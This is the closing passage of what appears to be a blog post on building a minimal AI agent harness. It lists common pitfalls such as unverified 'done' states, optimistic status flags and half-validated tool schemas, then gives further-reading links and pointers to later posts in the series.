- **Exiting on the model's word.** Without a gate the loop ships whatever the model last claimed; "done" must be a verified state, not a message (§5; [Post 05](../05-agent-failure-modes/index.md)).
- **A status flag that defaults to the good value.** An opt-in gate makes `verified` lie in exactly the case it was added for; three-valued is the honest shape (§8).
- **Letting a tool raise into the loop.** A tool that throws ends the run; every outcome, errors included, must return as an observation (§4).
- **Skipping either half of the schema.** `required` catches the missing argument and `additionalProperties: false` catches the invented one; validating only the first passes a hallucinated call straight through (§4; [Post 06](../06-tools-bash-code/index.md) §7).

---

## Further reading

- The four primitives this build assembles: [Post 03](../03-the-agent-loop/index.md) (the loop, its turn structure, and the four exits), [Post 06](../06-tools-bash-code/index.md) (schema validation and the return-value contract), [Post 11](../11-verification-loops/index.md) (ground truth and verbose failure reports), [Post 19](../19-loop-engineering/index.md) (layered exits, reserving before spending, and stall signals).
- Anthropic, "Building Effective Agents" (2024): the model-plus-loop framing this engine follows, including stopping conditions such as a maximum number of iterations.
- Trivedy, V., "The Anatomy of an Agent Harness" (2026): the source of `Agent = Model + Harness`, the equation §11 measures.
- Osmani, A., "Agent Harness Engineering" (2026): the harness as the layer that improves, and the "success is silent, failures are verbose" reporting rule the gate implements.
- Databricks, "What is an AI Agent Harness?" (2026): the prebuilt-versus-custom split the lede uses to justify building this by hand.
- OWASP, "OWASP Top 10 for LLM Applications" (2025): excessive agency, the risk category the deny-listed bash tool of §10 sits squarely inside.
- The companion code: [`code/24-minimal-harness/`](../../code/24-minimal-harness/), offline-runnable, with a ten-test suite and a one-command demo.
- Context Engineering, Build #1: the same exercise on the retrieval side, where every function likewise traces back to a principle.

Full citations are in [REFERENCES.md](../../REFERENCES.md).

---

## What to read next

- **[Post 25 — Build #2: hooks, sandbox, and sub-agents](../25-build-harness-plus/index.md)**: harden this exact harness into one you would trust unattended, starting with the deny-list of §10.
- **[Post 26 — Capstone](../26-capstone-coding-agent/index.md)**: the long-running coding agent this build grows into, across many contexts.
- **[Post 20 — The SDK & framework landscape](../20-sdk-landscape/index.md)**: what a prebuilt harness gives you, now that you have written one and can price the difference.
- **[Post 11 — Verification loops](../11-verification-loops/index.md)**: the gate at the heart of Build #1, in full, including the tasks that admit no gate at all.
